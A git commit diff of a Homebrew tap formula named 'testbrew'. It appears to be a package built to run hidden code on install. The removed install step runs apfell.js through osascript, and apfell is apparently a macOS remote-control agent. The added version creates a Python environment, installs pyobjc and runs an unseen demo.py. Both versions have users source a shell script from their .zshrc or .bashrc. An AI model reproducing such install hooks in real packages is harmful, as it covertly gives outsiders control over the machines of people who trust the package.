01e9c18a2de0cc7637fc186d51d35db32fd78f01
Testing Dot <fd1cb8964a6c4fa39bf6388251e21d25@outlook.com>
2025-05-14 05:51:11 -0400

    Initial brew tap commit

--- Formula/testbrew.rb
+++ Formula/testbrew.rb
@@ -1,20 +1,26 @@
 class Testbrew < Formula
-    desc "Test Brew"
-    homepage "https://github.com/testing-1-dot/"
-    url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
-    sha256 "ca3d04f8318eeb3141d77565b893e0099ac7d447d30d44374f7fa97fddd80f4b"
-    version "1.3"
+  desc "Test Brew"
+  homepage "https://github.com/testing-1-dot/"
+  url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
+  sha256 "2e6595d4b4ef48edc65214085907feebcfc626810a92814e68833adf68efd496"
+  version "1.3"
+  depends_on "python@3.12"
 
-    def install
-        bin.install Dir["*"]
-        system "chmod +x #{bin}/apfell.js && osascript -l JavaScript #{bin}/apfell.js"
+  def install
+    bin.install Dir["*"]
+    system "python3.12 -Im ensurepip"
+    system "python3.12 -Im pip install --upgrade --isolated"
+    system "python3.12 -m venv --system-site-packages --without-pip #{libexec}"
+    system "#{libexec}/bin/python3.12 -m ensurepip"
+    system "#{libexec}/bin/python3.12 -m pip install pyobjc"
+    system "#{libexec}/bin/python3.12 #{libexec}/demo.py"
   end
 
-    def caveats
-        <<~EOS
-        To finish installation, add the following line to .zshrc or .bashrc  
+  def caveats
+    <<~EOS
+    To finish installation, add the following line to .zshrc or .bashrc  
   source #{bin}/completion.sh
 Then reopen your terminal app
-        EOS
-    end
-    end
+    EOS
+  end
+end
